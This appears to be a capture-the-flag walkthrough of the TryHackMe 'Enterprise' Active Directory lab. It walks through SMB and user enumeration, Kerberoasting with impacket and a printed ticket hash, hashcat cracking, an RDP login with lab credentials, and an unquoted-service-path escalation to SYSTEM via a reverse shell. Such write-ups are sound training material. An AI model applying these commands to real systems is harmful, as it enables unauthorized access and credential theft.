## First enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Mon Apr  1 16:02:43 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 53,80,88,135,139,389,445,593,636,3268,3389,5357,5985,7990,9389 -Pn 10.10.81.144
Nmap scan report for 10.10.81.144
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-01 15:04:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-01T15:04:25+00:00
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2024-03-31T15:01:05
|_Not valid after:  2024-09-30T15:01:05
|_ssl-date: 2024-04-01T15:04:32+00:00; +1m25s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7990/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-01T15:04:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1m24s, deviation: 0s, median: 1m24s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  1 16:03:10 2024 -- 1 IP address (1 host up) scanned in 26.51 seconds
```
add `lab.enterprise.thm` to `/etc/host` file.

## Enumerating port 80

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/500b3abf-da19-4dc7-9926-7322dfc08aff)

checking the ip on a browser, we got a warning page, keep off. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c7672d03-679c-4fb1-9374-f8752df35998)

tried fuzzing for hidden directories, got nothing. 



## Enumerating SMB 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Enterprise]
└─$ smbclient -L //10.10.81.144/ -U anonymous -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Docs            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      Users Share. Do Not Touch!
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.81.144 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Enterprise]
└─$ smbclient //10.10.81.144/Docs -U anonymous -N  
Try "help" to get a list of possible commands.
smb: \> dir 
  .                                   D        0  Mon Mar 15 03:47:35 2021
  ..                                  D        0  Mon Mar 15 03:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 03:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 03:45:24 2021

                15587583 blocks of size 4096. 9916826 blocks available
smb: \> recurse off
smb: \> prompt off
smb: \> mget * 
getting file \RSA-Secured-Credentials.xlsx of size 15360 as RSA-Secured-Credentials.xlsx (29.0 KiloBytes/sec) (average 29.0 KiloBytes/sec)
getting file \RSA-Secured-Document-PII.docx of size 18432 as RSA-Secured-Document-PII.docx (33.8 KiloBytes/sec) (average 31.4 KiloBytes/sec)
smb: \> 
```
checking the smbshare for anonymous session, we could login anonymous and download some file in the `Docs` share. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3a326bb2-e245-4be2-9653-bb4dab59a914)

Tried to open these docs, we can see they are passworded. 

```shell
SMB         10.10.81.144    445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.81.144    445    LAB-DC           [+] LAB.ENTERPRISE.THM\anonymous: 
SMB         10.10.81.144    445    LAB-DC           500: LAB-ENTERPRISE\Administrator (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           501: LAB-ENTERPRISE\Guest (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
SMB         10.10.81.144    445    LAB-DC           520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.81.144    445    LAB-DC           571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.81.144    445    LAB-DC           572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.81.144    445    LAB-DC           1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
SMB         10.10.81.144    445    LAB-DC           1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1107: LAB-ENTERPRISE\nik (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1108: LAB-ENTERPRISE\replication (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1109: LAB-ENTERPRISE\spooks (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1110: LAB-ENTERPRISE\korone (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1111: LAB-ENTERPRISE\banana (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1112: LAB-ENTERPRISE\Cake (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1117: LAB-ENTERPRISE\varg (SidTypeUser)
SMB         10.10.81.144    445    LAB-DC           1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
SMB         10.10.81.144    445    LAB-DC           1119: LAB-ENTERPRISE\joiner (SidTypeUser)
```
using nxc, we are able to enumerate lists of users present in the domain.

```
atlbitbucket
bitbucket
nik
replication
spooks
korone
banana
Cake
Password-Policy-Exemption
Contractor
sensitive-account
contractor-temp
varg
adobe-subscription
joiner
```
we got lists of users, also we can see a `bitbucket` name, which means they might be something hidden in cloud. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b65936a5-219a-4b8a-ae30-b1537d090239)

checking around github, and we got a git enterprise we name `Nik` checking each commit and we got a potential passwd. `nik:ToastyBoi!`

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Enterprise]
└─$ impacket-GetUserSPNs -dc-ip 10.10.81.144  -outputfile hashes.asreproast1 lab.enterprise.thm/nik
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 02:20:01.333272  2021-04-26 16:16:41.570158             

[-] CCache file is not found. Skipping...
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Enterprise]
└─$ cat hashes.asreproast1  
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$4ee5d67fcb7af656269789f152b5102f$d6c5857a9e74dc1bce57adc76f4ff9b59a7eb60908b53f1965f8c650f1d378309a1b6b0609cf517b208862fce6fda3466365e71ffb0cfae5deca1142ba6f546daff458317669763a3cfff7910a4ae3ce8f1a54fc7d7a615b0e445e7a30250b297b531189b89008c161ab4affc80da05deb4795242ac47901821e820be7255cc2c39298e1e59acd6eda8b10b1feab8b5408cf93f8a2082f931eff884801a40b77e00b23abb10ea22364f1a2f7c77572e3b86e0af098b227086b14baa701bee9fdccf5f9043079a2af936ae1af15b0e5210a53ac9ca556fa15bafcd9dfd477ebe1f80d1191ee7340fc7b410309f4559a19699dd2bf811fea31da0b1f267f655f72f9668def7666189e949ca721eb63adb950d932bc59fe8e4a7f306784fb732bd12b14ab8f16caa3a7fa3411570c792d3b03b2d0658e74ce866f47c33e730bdd7fed1a81e993e07355262423ab5bdcfb10e0e5b0f92c0d90f69aa8ba3ad8848a2e0579238403fa6203c7547938d9998040886bcd042c1482c9070a63b8e756e607ed1a5736cba552e70ad522438231c368d9b1b8013502d9be363b853e4ed79b03391c38e1112e155b17cb370417c32a8102ad5d05a143c6722dcbe6b6b570acf0f9eb27718cb522586aec95e93693ed4ded86679f54d70c684560319da26455787a45138c4c8175bdb19b1af7e94a6f53236478f5f2caa16e062db1be50016eb551ba0b31f43b3f94a0818cc0c38f75e49e607dce37a361279f65a439eaa9685f8676d9a272423506ff24084f194259c1621bdd660ea6d913482729bc57434340d8e3f88744a07ecb5e93717afb710b5897894ac29fcd71829fc376ff9d4cea204658c6eec48379cc1523008f52b37b89f6a813edde431e3e9935039a70bfb9c91bbea72bc770fb20f20aaac94a0fef6a8103ad1ab328ae3f1d188d1d499219d2f6738e373a707264e905a4aff63ff62dcf9761e904f6716f33807d3a7e10b825845a053c603bed2cb39ae259a2c95d9b12020338247723fe4c902484d2c8ed6af6eefdf8441eb9731c017a1460d8dd19ecb34423e83b3b4d7b28d91c0647c8e5353a229123e551fc5fab135315bd917ca32bf9d734f80d9ce1278fa61204bd8da84877ad8620ae8078c1039951df17285a1c555428a9cfb904494541caa474e433c6bd7c2bd3e3a76e3f97e9d556766373293320286bff4e83fdad617fcef9d5c2ddb1b8e6ad4903bf1c99f2d3bebd10dd1b3e1468d2ea8164ba8cfe5106face1c38ef161a7229aa53bd14badef74a6a7fec780ce2234aa35bd6c28132bcfc82b354cf2065b8f4699947582b81918b378065b6342be39a40e584972fb50720a9cc13fd
```
DOing a kerberos attack using the creds gotten, we can see a keberoastable user `bitbucket`. Let's crack the password

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/30b121e2-d756-40cf-ac36-e762d427de89)

```shell
hashcat -m 13100 hashes.asreproast1 /usr/share/wordlists/rockyou.txt --force
```
cracked the hash. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Enterprise]
└─$ sudo nxc rdp 10.10.81.144 -u bitbucket -p littleredbucket         
RDP         10.10.81.144    3389   LAB-DC           [*] Windows 10 or Windows Server 2016 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (nla:True)
RDP         10.10.81.144    3389   LAB-DC           [+] LAB.ENTERPRISE.THM\bitbucket:littleredbucket (Pwn3d!)
```
using nxc to chech for access, we can login RDP. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a3454f23-399f-42fd-8945-6e31c65931c0)

we login RDP using the creds,



## Privilege Escalation

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f2edf7cc-690f-47b3-8b36-74b6ffb809f6)

running winpeas.exe, we can see an unquoted service path. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/96d63dcb-38a2-4ff6-b1b9-17f51596c04a)

checking info about the service, we can see it is running as `localsystem`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e75dcaf4-9e00-4627-bf4a-dc8e2c3807f7)

Abusing unquoted service path, we create a reverse shell payload in the path of the binary. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e11f6044-31a7-499c-a999-ccc97e5334e5)

restarted the service and we got a reverse shell as `nt authority`

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4675c53c-cd4f-46b6-a2b3-ed3dc2486add)

and we are through 🕶️
